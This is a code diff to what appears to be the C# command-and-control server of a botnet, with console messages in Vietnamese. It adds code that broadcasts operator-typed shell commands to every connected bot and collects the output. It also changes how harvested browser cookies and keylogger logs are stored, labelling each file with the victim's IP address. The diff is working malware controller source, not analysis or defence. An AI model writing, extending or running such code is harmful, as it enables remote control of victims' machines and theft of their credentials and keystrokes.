@@ -78,19 +78,20 @@ namespace Control
 
         public static void receiveFileSocket(TcpClient client,string type)
         {
+            string ip = client.Client.RemoteEndPoint.ToString().Split(':')[0];
 
             string fileName ="";
             if (type =="cookies")
             {
-                fileName = "cookies.txt";
+                fileName =ip+  "_cookies.txt";
             }  
             else if( type =="keylogger")
             {
-                fileName = "keylogger.txt";
+                fileName = ip+ "_keylogger.txt";
             }
             else if (type == "cmd")
             {
-                fileName = "cmdResult.txt";
+                fileName =ip+  "_cmdResult.txt";
             }
 
             NetworkStream stream = client.GetStream();
@@ -143,19 +144,6 @@ namespace Control
                 string url = Console.ReadLine();
                 string ms = "cookies?" + url + "?";
                 List<Task> cookies = new List<Task>();
-
-                //foreach (var cli in clients.Keys)
-                //{
-                //    isFinished = false;
-                //    Thread th_cli = new Thread(() => {
-                //        sendMessageSocket(ms, cli.Client);
-                //        Console.WriteLine("Sending request get cookies...");
-                //        receiveFileSocket(cli, "cookies");
-                //        Console.WriteLine("Receive cookies complete!");
-                //    });
-                //    th_cli.Start();
-                //}
-
                 foreach (var cli in clients.Keys)
                 {
                     isFinished = false;
@@ -178,10 +166,6 @@ namespace Control
                 await Task.WhenAll(cookies);
                 isFinished = true;
                 Console.WriteLine("Nhan thanh cong cac file cookies tu botnet.");
-                //sendMessageSocket(ms, socket);
-                //Console.WriteLine("Sending request get cookies...");
-                //receiveFileSocket(client,"cookies");
-                //Console.WriteLine("Receive cookies complete!");
             }
             else if (command == "get keylogger")
             {
@@ -249,10 +233,38 @@ namespace Control
             }
             else if (command == "run cmd command")
             {
-                //string cmd = "";
-                //Console.Write("Enter command:");
-                //cmd = Console.ReadLine();
-                //string ms = "run cmd command " + cmd;
+                string cmd = "";
+                Console.Write("Enter command:");
+                cmd = Console.ReadLine();
+                string ms = "run cmd command " + cmd;
+
+                List<Task> cmdTasks = new List<Task>();
+
+                foreach (var cli in clients.Keys)
+                {
+                    isFinished = false;
+                    cmdTasks.Add(Task.Run(async () =>
+                    {
+                        try
+                        {
+                            clients.TryGetValue(cli, out string ip);
+                            sendMessageSocket(ms, cli.Client);
+                            Console.WriteLine("Sending request get cmd to " + ip + "...");
+                            receiveFileSocket(cli, "cmd");
+                            Console.WriteLine("Receive file cmd from " + ip + "!");
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
+                        }
+                    }));
+                }
+
+                await Task.WhenAll(cmdTasks);
+                isFinished = true;
+                Console.WriteLine("Nhan thanh cong cac file cmd tu botnet.");
+
+
                 //sendMessageSocket(ms,socket);
                 //Console.WriteLine("Sending request run cmd command...");
                 //receiveFileSocket(client, "cmd");
